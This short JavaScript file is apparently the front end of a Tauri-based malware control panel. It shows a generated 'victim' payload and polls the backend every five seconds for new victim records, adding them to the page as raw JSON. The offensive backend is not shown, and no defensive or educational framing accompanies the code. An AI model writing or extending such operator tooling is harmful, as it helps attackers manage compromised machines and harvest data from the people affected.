const invoke = window.__TAURI__.invoke

async function code() {
  document.getElementById("victim_exe").innerHTML =
      await invoke("victim_payload", {});
  while (true) {
    var get_new = await invoke("get_new", {});
    for (let i in get_new) {
      document.getElementById("victims").innerHTML =
          `<pre>${JSON.stringify(get_new[i], null, "\t")}</pre>` +
          document.getElementById("victims").innerHTML;
    }
    await sleep(5000);
  }
}

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

code();
